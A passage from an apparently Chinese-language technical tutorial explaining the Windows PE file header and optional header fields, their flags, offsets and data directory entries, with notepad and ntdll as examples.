NumberOfSymbols：调试相关，暂不了解 SizeOfOptionalHeader：标识了IMAGE_OPTIONAL_HEADER结构的大小。未做修改的默认情况下，32位和64位PE文件扩展PE头的大小如下： 文件位数 十六进制 十进制 32位 E0h 224字节 64位 F0h 240字节 Characteristics：文件属性。该字段长度16位，每一位都有两种含义，由0-15的每一位提供文件属性。这个字段是一个位掩码，可以通过对这个值进行位运算来确定设置了哪些标志。 数据位 常量符号 含义 0001h IMAGE_FILE_RELOCS_STRIPPED 文件中不存在重定位信息 0002h IMAGE_FILE_EXECUTABLE_IMAGE 文件是可执行的。如果为0，一般是链接时出问题了 0004h IMAGE_FILE_LINE_NUMS_STRIPPED 不存在行号信息，行号信息被移去 0008h IMAGE_FILE_LOCAL_SYMS_STRIPPED 不存在符号信息，符号信息被移去 0010h IMAGE_FILE_AGGRESSIVE_WS_TRIM 调整工作集 0020h IMAGE_FILE_LARGE_ADDRESS_AWARE 应用程序可以处理超过2GB的地址。该功能是从NT SP3开始被支持的。因为大部分数据库服务器需要很大的内存，而NT仅提供2CB给应用程序，所以从NT SP3开始，通过加载/3GB参数，可以使应用程序被分配2～3GB区域的地址,而该处原来属于系统内存区 0040h 此标志保留 0080h IMAGE_FILE_BYTES_REVERSED_LO 小尾方式，处理机的低位字节是相反的 0100h IMAGE_FILE_32BIT_MACHINE 只在32位平台上运行 0200h IMAGE_FILE_DEBUG_STRIPPED 不包含调试信息，.DBG文件的调试信息被移去 0400h IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP 不能从可移动盘运行。如果映像文件在可移动介质中,则先复制到交换文件中再运行。 0800h IMAGE_FILE_NET_RUN_FROM_SWAP 不能从网络运行如果映像文件在网络中,则复制到交换文件后才能运行。 1000h IMAGE_FILE_SYSTEM 系统文件（如驱动程序），不能直接运行 2000h IMAGE_FILE_DLL 这是一个DLL文件 4000h IMAGE_FILE_UP_SYSTEM_ONLY 文件只能运行在单处理器上，不能在多处理器计算机上运行 8000h IMAGE_FILE_BYTES_REVERSED_HI 大尾方式，处理机的高位字节是相反的 表格的由来原来是这张图，每一个位代表各自的含义，但是根据这个表来查文件属性要将得到的值拆开。比如一个文件的Characteristics字段的值为0102h。0000 0001 0000 0010。第2位为1，根据下表，表示文件可执行。第8位为1，根据下表，表示该PE文件只在32位平台上运行。不如下面这张表，直接写成十六进制，不用将每位拆成二进制位。于是我将上述两张表作了合并形成了表格。 123456789101112131415#define IMAGE_FILE_RELOCS_STRIPPED 0x0001 // Relocation info stripped from file.#define IMAGE_FILE_EXECUTABLE_IMAGE 0x0002 // File is executable (i.e. no unresolved external references).#define IMAGE_FILE_LINE_NUMS_STRIPPED 0x0004 // Line nunbers stripped from file.#define IMAGE_FILE_LOCAL_SYMS_STRIPPED 0x0008 // Local symbols stripped from file.#define IMAGE_FILE_AGGRESIVE_WS_TRIM 0x0010 // Aggressively trim working set#define IMAGE_FILE_LARGE_ADDRESS_AWARE 0x0020 // App can handle &gt;2gb addresses#define IMAGE_FILE_BYTES_REVERSED_LO 0x0080 // Bytes of machine word are reversed.#define IMAGE_FILE_32BIT_MACHINE 0x0100 // 32 bit word machine.#define IMAGE_FILE_DEBUG_STRIPPED 0x0200 // Debugging info stripped from file in .DBG file#define IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP 0x0400 // If Image is on removable media, copy and run from the swap file.#define IMAGE_FILE_NET_RUN_FROM_SWAP 0x0800 // If Image is on Net, copy and run from the swap file.#define IMAGE_FILE_SYSTEM 0x1000 // System File.#define IMAGE_FILE_DLL 0x2000 // File is a DLL.#define IMAGE_FILE_UP_SYSTEM_ONLY 0x4000 // File should only be run on a UP machine#define IMAGE_FILE_BYTES_REVERSED_HI 0x8000 // Bytes of machine word are reversed. 当Characteristics有IMAGE_FILE_RELOCS_STRIPPED属性时，表明该PE文件中不包含重定位表信息。那么该PE文件只能加载到它预设的ImageBase，如果这个基址被占用，系统加载器会报错。 例 从win7分别拷出了32位和64位的notepad，查看它们标准PE头的字段 32位notepad路径：C:\\Windows\\SysWOW64 otepad.exe 64位notepad路径：C:\\Windows\\System32 otepad.exe notepad_32notepad_64 字段 值 含义 WORD Machine 014Ch 可运行在Intel i386及后续的型号CPU WORD NumberOfSections 4h Section的数量为4 DWORD TimeDateStamp 4A5BC60Fh DWORD PointerToSymbolTable 0 DWORD NumberOfSymbols 0 WORD SizeOfOptionalHeader 0E0h 扩展PE头的大小为0E0h WORD Characteristics 0102 文件可执行，只在32位平台上运行 字段 值 含义 WORD Machine 8664h 可运行在64位的CPU型号 WORD NumberOfSections 6h Section的数量为6 DWORD TimeDateStamp 4A5BC9B3h DWORD PointerToSymbolTable 0 DWORD NumberOfSymbols 0 WORD SizeOfOptionalHeader 0F0h 扩展PE头的大小为0F0h WORD Characteristics 0022 文件可执行，应用程序可以处理超过2GB的地址 扩展PE头 32位和64位扩展PE头不一样，但它们的差异很小，这里以32位的扩展PE头为例进行介绍。 32位和64位扩展PE头winnt.hdiff版PE32PE64123456789101112131415161718192021222324252627282930313233343536373839404142typedef struct _IMAGE_OPTIONAL_HEADER &#123; // // Standard fields. // WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; DWORD BaseOfData; // // NT additional fields. // DWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;1234567891011121314151617181920212223242526272829303132typedef struct _IMAGE_OPTIONAL_HEADER64 &#123; WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; ULONGLONG ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; ULONGLONG SizeOfStackReserve; ULONGLONG SizeOfStackCommit; ULONGLONG SizeOfHeapReserve; ULONGLONG SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;PE32+相比于PE32：没有BaseOfData成员ImageBase、SizeOfStackReserve、SizeOfStackCommit、SizeOfHeapReserve、SizeOfHeapCommit成员由DWORD增加到了ULONGLONG。DWORD：unsigned long，32位，4字节；UNLONGLONG：unsigned __int64，64位，8字节。减少了1个DWORD，增加了5个4字节，所以PE32+的扩展PE头相比于PE32的扩展PE头大了16字节。IMAGE_OPTIONAL_HEADER32（224字节）-&gt;IMAGE_OPTIONAL_HEADER64（240字节）PE32PE32+123456789101112131415161718192021222324252627282930313233343536373839404142typedef struct _IMAGE_OPTIONAL_HEADER &#123; // // Standard fields. // WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; DWORD BaseOfData; // // NT additional fields. // DWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;123456789101112131415161718192021222324252627282930313233typedef struct _IMAGE_OPTIONAL_HEADER64 &#123; WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode;- DWORD BaseOfData;+ ULONGLONG ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics;+ ULONGLONG SizeOfStackReserve;+ ULONGLONG SizeOfStackCommit;+ ULONGLONG SizeOfHeapReserve;+ ULONGLONG SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64; winnt.h带偏移版123456789101112131415161718192021222324252627282930313233typedef struct _IMAGE_OPTIONAL_HEADER &#123; WORD Magic; // PE32：10Bh PE32+：20Bh BYTE MajorLinkerVersion; // 链接器主版本号 BYTE MinorLinkerVersion; // 链接器次版本号 DWORD SizeOfCode; // 所有代码节的总和（文件对齐后的大小），编译器填的（没用） DWORD SizeOfInitializedData; // 包含所有已经初始化数据的节的总大小（文件对齐后的大小），编译器填的（没用） DWORD SizeOfUninitializedData; // 包含未初始化数据的节的总大小（文件对齐后的大小），编译器填的（没用） DWORD AddressOfEntryPoint; // 程序入口 DWORD BaseOfCode; // 代码开始的基址，编译器填的（没用） DWORD BaseOfData; // 数据开始的基址，编译器填的（没用） DWORD ImageBase; // 内存镜像基址 DWORD SectionAlignment; // 内存对齐 DWORD FileAlignment; // 文件对齐 WORD MajorOperatingSystemVersion; // 标识操作系统版本号，主版本号 WORD MinorOperatingSystemVersion; // 标识操作系统版本号，次版本号 WORD MajorImageVersion; // PE文件自身的版本号 WORD MinorImageVersion; // PE文件自身的版本号 WORD MajorSubsystemVersion; // 运行所需子系统版本号 WORD MinorSubsystemVersion; // 运行所需子系统版本号 DWORD Win32VersionValue; // 子系统版本的值，必须为0 DWORD SizeOfImage; // 内存中整个PE文件的映射的尺寸，可比实际的大，是SectionAlighment的整数倍 DWORD SizeOfHeaders; // DOS头+PE头+节表的大小总和，按照文件对齐后的大小 DWORD CheckSum; // 校验和 一些系统文件会有这个值，用来判断文件是否被修改 WORD Subsystem; // 子系统，驱动程序(1)、图形界面(2) 、控制台/DLL(3) WORD DllCharacteristics; // 文件特性，并不只对dll文件 DWORD SizeOfStackReserve; // 初始化时保留的栈大小 DWORD SizeOfStackCommit; // 初始化时实际提交的大小 DWORD SizeOfHeapReserve; // 初始化时保留的堆大小 DWORD SizeOfHeapCommit; // 初始化时实践提交的大小 DWORD LoaderFlags; // 调试相关 DWORD NumberOfRvaAndSizes; // 目录项数目 IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; // 数据目录表，结构体数组&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;以下的偏移量是基于PE文件头（IMAGE_NT_HEADERS） 12345678910111213141516171819202122232425262728293031323334typedef struct _IMAGE_OPTIONAL_HEADER &#123; +18h WORD Magic; // PE32：10Bh PE32+：20Bh +1Ah BYTE MajorLinkerVersion; // 链接器主版本号 +1Bh BYTE MinorLinkerVersion; // 链接器次版本号 +1Ch DWORD SizeOfCode; // 所有代码节的总和（文件对齐后的大小），编译器填的（没用） +20h DWORD SizeOfInitializedData; // 包含所有已经初始化数据的节的总大小（文件对齐后的大小），编译器填的（没用） +24h DWORD SizeOfUninitializedData; // 包含未初始化数据的节的总大小（文件对齐后的大小），编译器填的（没用） +28h DWORD AddressOfEntryPoint; // 程序入口 +2Ch DWORD BaseOfCode; // 代码开始的基址，编译器填的（没用） +30h DWORD BaseOfData; // 数据开始的基址，编译器填的（没用） +34h DWORD ImageBase; // 内存镜像基址 +38h DWORD SectionAlignment; // 内存对齐 +3Ch DWORD FileAlignment; // 文件对齐 +40h WORD MajorOperatingSystemVersion; // 标识操作系统版本号，主版本号 +42h WORD MinorOperatingSystemVersion; // 标识操作系统版本号，次版本号 +44h WORD MajorImageVersion; // PE文件自身的版本号 +46h WORD MinorImageVersion; // PE文件自身的版本号 +48h WORD MajorSubsystemVersion; // 运行所需子系统版本号 +4Ah WORD MinorSubsystemVersion; // 运行所需子系统版本号 +4Ch DWORD Win32VersionValue; // 子系统版本的值，必须为0 +50h DWORD SizeOfImage; // 内存中整个PE文件的映射的尺寸，可比实际的大，是SectionAlighment的整数倍 +54h DWORD SizeOfHeaders; // DOS头+PE头+节表的大小总和，按照文件对齐后的大小 +58h DWORD CheckSum; // 校验和 一些系统文件会有这个值，用来判断文件是否被修改 +5Ch WORD Subsystem; // 子系统，驱动程序(1)、图形界面(2) 、控制台/DLL(3) +5Eh WORD DllCharacteristics; // 文件特性，并不只对dll文件 +60h DWORD SizeOfStackReserve; // 初始化时保留的栈大小 +64h DWORD SizeOfStackCommit; // 初始化时实际提交的大小 +68h DWORD SizeOfHeapReserve; // 初始化时保留的堆大小 +6Ch DWORD SizeOfHeapCommit; // 初始化时实践提交的大小 +70h DWORD LoaderFlags; // 调试相关 +74h DWORD NumberOfRvaAndSizes; // 目录项数目 +78h IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; // 数据目录表，结构体数组&#125;IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; 加粗的字段是重要字段，代码样式的字段了解即可 Magic：标识当前PE文件是PE32还是PE32+。是判断PE位数的关键属性。之前讲的一些属性也能看出PE是32还是64位，但那些属性不是特别准，最准确的是这个属性。 PE的位数 值 PE32 010Bh PE32+ 020Bh 12#define IMAGE_NT_OPTIONAL_HDR32_MAGIC 0x10b#define IMAGE_NT_OPTIONAL_HDR64_MAGIC 0x20b MajorLinkerVersion：链接器的主版本号。由链接器填写的辅助性信息。 MinorLinkerVersion：链接器的次版本号。由链接器填写的辅助性信息。 SizeOfCode：有IMAGE_SCN_CNT_CODE属性的区块的总大小(只入不舍)，这个值是已向上对齐到某一个值的整数倍。例如，本例是200h，即对齐的是一个磁盘扇区字节数（200h）的整数倍。在通常情况下，多数文件只有1个Code块，所以这个字段和.text块的大小匹配。 如果有两个节，每个节大小都是10字节，FileAlignment是200h。那么SizeOfCode是400h（2个200h）。 SizeOfInitializedData：已初始化数据块的大小，即在编译时所构成的块的大小（不包括代码段)。但这个数据不太准确。 比如声明了一个全局变量，赋了初值。就是已初始化的数据 SizeOfUninitializedData：未初始化数据块的大小，装载程序要在虚拟地址空间中为这些数据约定空间。这些块在磁盘文件中不占空间，就像“UninitializedData”这一术语所暗示的一样，这些块在程序开始运行时没有指定值。未初始化数据通常在.bss块中。 比如声明了一个全局变量，没有赋初值。就是未初始化的数据 SizeOfCode、SizeOfInitializedData、SizeOfUninitializedData是编译器填写的统计信息，不具备参考意义。 AddressOfEntryPoint：程序执行入口RVA。指PE文件在内存展开后，程序在哪个地址开始执行。这个值是相对于ImageBase的偏移。 BaseOfCode：代码段的起始地址RVA。这个值是相对于ImageBase的偏移。 BaseOfData：数据段的起始地址RVA。这个值是相对于ImageBase的偏移。 ImageBase：内存镜像基址。指PE文件在内存中首选在哪个地址开始载入拉伸。如果目前有其他文件占据了这个地址，要进行基址重定位。对于DLL这个值通常并不被操作系统采纳，如果开启了随机基址的EXE也是如此。 SectionAlignment：PE文件在内存时的区块对齐值。每个区块在载入内存时的地址必须是该字段数值的整数倍。默认的对齐尺寸是目标CPU的页尺寸。对运行在Windows 9x/Me下的用户模式可执行文件，最小的对齐尺寸是每页1000h(4KB)。 FileAlignment：PE文件在磁盘上时的区块对齐值。每个区块在磁盘上的地址必须是该字段数值的整数倍。对于x86可执行文件，这个值通常是200h或1000h，这是为了保证块总是从磁盘的扇区开始。这个值必须是2的幂，其最小值为200h。 MajorOperatingSystemVersion：要求操作系统的最低版本号的主版本号。 MinorOperatingSystemVersion：要求操作系统的最低版本号的次版本号。 MajorImageVersion：该PE文件自身的主版本号，由程序员定义。 MinorImageVersion：该PE文件自身的次版本号，由程序员定义。 MajorSubsystemVersion：要求最低子系统版本的主版本号。这个值与下一个字段一起，通常被设置为4，可以通过链接器开关ISUBSYSTEM来设置。 MinorSubsystemVersion：要求最低子系统版本的次版本号。 Win32VersionValue：子系统版本的值，从来不用的字段，必须为0，别的不可以。 SizeOfImage：内存中整个PE文件映射的大小，可比实际的值大。是指文件载入内存后从ImageBase开始到最后一个块的大小（最后一个块已向上对齐）。该值是SectionAlignment的整数倍。 SizeOfHeaders：DOS头+PE文件头+节表按照文件对齐后的大小。比如文件对齐大小是0x200h，DOS头+PE头+节表的总大小加起来目前是0x302h，要对齐，所以最终是0x400h。即SizeOfHeaders的值要是FileAlignment的整数倍。 CheckSum：该PE文件的检验和。该字段不是所有的文件都有，往往是系统中一些重要的dll、sys有这个值，是操作系统用来判断这个文件是否被人修改。 计算方法：文件中两个字节两个字节地相加，再+文件长度（溢出无所谓），最终的值就是校验和。比如，0x5A4Dh+下两个字节+…+下两个字节 但这个值达不到检验一个文件是否被篡改的功能。因为计算方法公开，而且微软也提供了现成的api来计算校验和。攻击者对文件进行修改，顺手把ChekSum计算一下，也改了就好了。 Subsystem：表明可执行文件的子系统，即指定了指定了可执行文件的运行环境。它告诉操作系统如何管理和执行该程序。这个字段的值决定了程序的界面类型，比如是命令行工具、图形界面应用程序还是其他类型的程序。该字段是个枚举类型。 值 子系统 0 未知 1 不需要子系统（例如驱动程序） 2 图形接口子系统（GUI），表示程序运行在Windows图形用户界面（GUI）下 3 字符子系统（CUI），表示程序是一个控制台应用程序，运行在命令行界面(CUI，即Console User Interface) 5 OS/2字符子系统 7 POSIX字符子系统，表示程序遵循POSIX标准的控制台应用程序 8 保留 9 Windows CE图形界面，表示程序是为Windows CE设计的图形界面应用程序 10 表示程序是一个EFI(可扩展固件接口)应用程序。 驱动程序(1)、图形界面(2) 、控制台/DLL(3)。所有的值如下： 123456789101112131415#define IMAGE_SUBSYSTEM_UNKNOWN 0 // Unknown subsystem.#define IMAGE_SUBSYSTEM_NATIVE 1 // Image doesn&#x27;t require a subsystem.#define IMAGE_SUBSYSTEM_WINDOWS_GUI 2 // Image runs in the Windows GUI subsystem.#define IMAGE_SUBSYSTEM_WINDOWS_CUI 3 // Image runs in the Windows character subsystem.#define IMAGE_SUBSYSTEM_OS2_CUI 5 // image runs in the OS/2 character subsystem.#define IMAGE_SUBSYSTEM_POSIX_CUI 7 // image runs in the Posix character subsystem.#define IMAGE_SUBSYSTEM_NATIVE_WINDOWS 8 // image is a native Win9x driver.#define IMAGE_SUBSYSTEM_WINDOWS_CE_GUI 9 // Image runs in the Windows CE subsystem.#define IMAGE_SUBSYSTEM_EFI_APPLICATION 10 //#define IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER 11 //#define IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER 12 //#define IMAGE_SUBSYSTEM_EFI_ROM 13#define IMAGE_SUBSYSTEM_XBOX 14#define IMAGE_SUBSYSTEM_WINDOWS_BOOT_APPLICATION 16#define IMAGE_SUBSYSTEM_XBOX_CODE_CATALOG 17 DllCharacteristics：指定了PE文件的一些特性和行为。不要被名字所迷惑，它不是只针对DLL文件的，是对PE文件的。这个字段是一个位掩码，可以通过对这个值进行位运算来确定设置了哪些标志。它的数据宽度是16位（4字节），其每一数据位对应的属性如下所示： 数据位 常量符号 含义 0x0001 IMAGE_LIBRARY_PROCESS_INIT Reserved 0x0002 IMAGE_LIBRARY_PROCESS_TERM Reserved 0x0004 IMAGE_LIBRARY_THREAD_INIT Reserved 0x0008 IMAGE_LIBRARY_THREAD_TERM Reserved 0x0020 IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA 支持高熵的地址空间布局随机化（ASLR） 0x0040 IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE 可以在内存中随机位置加载，支持地址空间布局随机化（ASLR） 0x0080 IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY 必须进行签名校验 0x0100 IMAGE_DLLCHARACTERISTICS_NX_COMPAT 支持数据执行防止（DEP） 0x0200 IMAGE_DLLCHARACTERISTICS_NO_ISOLATION 不是隔离的。这个标志位指示PE文件不使用Windows资源隔离机制。资源隔离机制是一种允许开发者为不同的区域设置或语言版本的应用程序提供特定资源（如字符串、图标等）的技术。如果设置了 NO_ISOLATION 标志，它表明该PE文件不使用这种隔离机制，可能是因为它不包含任何本地化资源，或者它使用了其他机制来处理资源。 0x0400 IMAGE_DLLCHARACTERISTICS_NO_SEH 不使用结构化异常处理（SEH）。没有SEH的DLL更安全，因为它们不会被异常处理相关的攻击所利用。 0x0800 IMAGE_DLLCHARACTERISTICS_NO_BIND 表示不允许对该PE文件进行绑定。绑定是一种优化技术，它在PE文件（通常是DLL）被加载时减少了解析导入函数地址所需的时间。当一个DLL被绑定到一个可执行文件时，它的导入地址表（IAT）会被预先填充具体的地址，而不是在运行时解析。如果设置了 NO_BIND 标志，它表明该PE文件不应该被绑定。这可能是因为开发者希望确保导入的地址总是在运行时解析，以便于更新或安全性考虑。 0x1000 IMAGE_DLLCHARACTERISTICS_APPCONTAINER 表示该PE文件是为运行在AppContainer中的应用程序设计的。AppContainer是一种沙箱机制，由Windows 8和更高版本的Windows操作系统提供，用于限制应用程序的权限，从而提高系统的安全性。当这个标志被设置时，它表明该程序或库被设计为在这种受限的执行环境中运行，通常用于现代的Windows Store应用。 0x2000 IMAGE_DLLCHARACTERISTICS_WDM_DRIVER 表示该PE文件是一个WDM驱动程序 0x4000 IMAGE_DLLCHARACTERISTICS_GUARD_CF 表示该PE文件支持控制流保护。控制流保护（Control Flow Guard, CFG）是一种由Microsoft开发的安全特性，用于防止内存损坏漏洞被利用，特别是那些可能导致代码执行流程被恶意篡改的漏洞。当设置了 GUARD_CF 标志时，它表明PE文件已经使用CFG进行了编译和链接，操作系统加载器将会启用CFG，以增加对攻击者利用未经验证或不安全的间接函数调用的防护。 0x8000 IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE 表示该PE文件是终端服务兼容的 制作表格参考的图和枚举常量1234567891011121314// IMAGE_LIBRARY_PROCESS_INIT 0x0001 // Reserved.// IMAGE_LIBRARY_PROCESS_TERM 0x0002 // Reserved.// IMAGE_LIBRARY_THREAD_INIT 0x0004 // Reserved.// IMAGE_LIBRARY_THREAD_TERM 0x0008 // Reserved.#define IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA 0x0020 // Image can handle a high entropy 64-bit virtual address space.#define IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE 0x0040 // DLL can move.#define IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY 0x0080 // Code Integrity Image#define IMAGE_DLLCHARACTERISTICS_NX_COMPAT 0x0100 // Image is NX compatible#define IMAGE_DLLCHARACTERISTICS_NO_ISOLATION 0x0200 // Image understands isolation and doesn&#x27;t want it#define IMAGE_DLLCHARACTERISTICS_NO_SEH 0x0400 // Image does not use SEH. No SE handler may reside in this image#define IMAGE_DLLCHARACTERISTICS_NO_BIND 0x0800 // Do not bind this image.#define IMAGE_DLLCHARACTERISTICS_APPCONTAINER 0x1000 // Image should execute in an AppContainer#define IMAGE_DLLCHARACTERISTICS_WDM_DRIVER 0x2000 // Driver uses WDM model#define IMAGE_DLLCHARACTERISTICS_GUARD_CF 0x4000 // Image supports Control Flow Guard. 例 win10下找一个exe和dll看下这个位notepad.exentdll.dllsubsystem：2h，GUI界面程序DllCharacteristics：0xC140h被设置的位含义IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE (0x0040)支持ASLRIMAGE_DLLCHARACTERISTICS_NX_COMPAT (0x0100)支持DEPIMAGE_DLLCHARACTERISTICS_NO_ISOLATION (0x0200)不是隔离的IMAGE_DLLCHARACTERISTICS_NO_SEH (0x0400)不使用SEHIMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE (0x8000)终端服务器兼容，意味着可以在远程桌面会话中正常工作subsystem：3h，控制台/DLLDllCharacteristics：0x4140h被设置的位含义IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE (0x0040)支持ASLRIMAGE_DLLCHARACTERISTICS_NX_COMPAT (0x0100)支持DEPIMAGE_DLLCHARACTERISTICS_NO_SEH (0x0400)不使用SEH SizeOfStackReserve：在EXE文件里，初始化时为线程保留的栈的大小。它在一开始只提交其中一部分，只有在必要时才提交剩下的部分。 SizeOfStackCommit：在EXE文件里，初始化时实际提交的栈的大小，默认值是4KB。 SizeOfHeapReserve：在EXE文件里，初始化时为线程默认保留的堆的大小，默认值是1MB。 SizeOfHeapCommit：在EXE文件里，初始化时实际提交的堆的小小，默认值是4KB LoaderFlags：与调试有关，默认值为0。Reserved, must be zero.（MSDN）。被废弃的成员值，MSDN上原话为“This member is obsolete”。但是该值在某些情况下还是会被用到的，比如针对原始的低版本的OD来说，修改该值会起到反调试的作用。 NumberOfRvaAndSizes：数据目录表的个数。这个字段的值从Windows NT 发布以来一直是16。 DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]：数据目录表，是个结构体数组，每个成员是IMAGE_DATA_DIRECTORY结构体。不同的索引是不同的表。该字段是个枚举类型。 1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; VirtualAddress：这张表起始地址，这个值是RVA 想在文件中找，还需转成FOA Size：表的大小。 是指IMAGE_DATA_DIRECTORY结构体和其使用的所有数据之和（比如导出表里有指针，要算上这个指针其指向子表所占用的空间） 这个值是编译器编译完填写的值，没有实际意义。该值不会影响程序的运行（没尝试修改验证过？） 序号 成员 结构 偏移量（PE） 偏移量PE32+ 0 Export Table IMAGE_DIRECTORY_ENTRY_EXPORT 78h 88h 1 Import Table IMAGE_DIRECTORY_ENTRY_IMPORT 80h 90h 2 Resources Table IMAGE_DIRECTORY_ENTRY_RESOURCE 88h 98h 3 Exception Table IMAGE_DIRECTORY_ENTRY_EXCEPTION 90h A0h 4 Security Table IMAGE_DIRECTORY_ENTRY_SECURITY 98h A8h 5 Base relocation Table IMAGE_DIRECTORY_ENTRY_BASERELOC A0h B0h 6 Debug IMAGE_DIRECTORY_ENTRY_DEBUG A8h B8h 7 Copyright IMAGE_DIRECTORY_ENTRY_ARCHITECTURE B0h C0h 8 Global Ptr IMAGE_DIRECTORY_ENTRY_GLOBALPTR B8h C8h 9 Thread local storage(TLS) IMAGE_DIRECTORY_ENTRY_TLS C0h D0h 10 Load configuration IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG C8h D8h 11 Bound Import IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT D0h E0h 12 Import Address Table(IAT) IMAGE_DIRECTORY_ENTRY_IAT D8h E8h 13 Delay Import IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT E0h F0h 14 COM descriptor IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR E8h F8h 15 保留，必须为0 F0h 100h 12345678910111213141516#define IMAGE_DIRECTORY_ENTRY_EXPORT 0 // Export Directory#define IMAGE_DIRECTORY_ENTRY_IMPORT 1 // Import Directory#define IMAGE_DIRECTORY_ENTRY_RESOURCE 2 // Resource Directory#define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 // Exception Directory#define IMAGE_DIRECTORY_ENTRY_SECURITY 4 // Security Directory#define IMAGE_DIRECTORY_ENTRY_BASERELOC 5 // Base Relocation Table#define IMAGE_DIRECTORY_ENTRY_DEBUG 6 // Debug Directory// IMAGE_DIRECTORY_ENTRY_COPYRIGHT 7 // (X86 usage)#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7 // Architecture Specific Data#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8 // RVA of GP#define IMAGE_DIRECTORY_ENTRY_TLS 9 // TLS Directory#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10 // Load Configuration Directory#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11 // Bound Import Directory in headers#define IMAGE_DIRECTORY_ENTRY_IAT 12 // Import Address Table#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13 // Delay Load Import Descriptors#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 // COM Runtime descriptor"},{"title":"PE解析器","path":"/wiki/PE/PE解析器.html","content":"需求 输出一个PE文件的各个字段 总体设计 打开PE文件创建内存文件映像 判断是否是PE文件 